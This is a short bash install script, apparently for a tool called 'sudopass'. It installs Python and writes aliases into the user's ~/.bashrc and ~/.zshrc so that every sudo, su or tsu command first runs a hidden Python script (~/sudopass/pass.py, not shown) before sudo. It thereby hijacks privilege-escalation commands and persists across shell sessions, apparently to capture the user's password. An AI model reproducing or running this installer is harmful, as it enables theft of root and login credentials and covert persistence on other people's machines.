#!/bin/bash
apt install python -y
echo "alias sudo='python3 ~/sudopass/pass.py && sudo'" >> ~/.bashrc
echo "alias sudo='python3 ~/sudopass/pass.py && sudo'" >> ~/.zshrc
echo "alias tsu='python3 ~/sudopass/pass.py && sudo'" >> ~/.bashrc
echo "alias tsu='python3 ~/sudopass/pass.py && sudo'" >> ~/.zshrc
echo "alias su='python3 ~/sudopass/pass.py && sudo'" >> ~/.bashrc
echo "alias su='python3 ~/sudopass/pass.py && sudo'" >> ~/.zshrc
